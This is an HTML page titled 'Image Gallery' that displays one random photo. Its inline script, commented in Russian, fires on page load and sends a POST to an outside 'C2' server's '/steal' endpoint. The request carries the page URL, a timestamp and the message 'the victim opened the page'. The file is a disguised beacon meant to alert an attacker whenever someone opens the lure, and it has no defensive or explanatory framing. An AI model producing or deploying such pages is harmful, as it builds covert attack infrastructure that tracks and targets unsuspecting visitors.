<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image Gallery</title>
    <style>
        body {
            margin: 0;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <img src="https://picsum.photos/800/600.jpg?random=42" alt="Beautiful photo">

    <script>
        // Отправляем данные на C2 сервер, как только страница загрузилась
        fetch('https://c2-telegram-server.onrender.com/steal', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                msg: 'Жертва открыла страницу!',
                url: window.location.href,
                time: new Date().toISOString()
            })
        });
    </script>
</body>
</html>
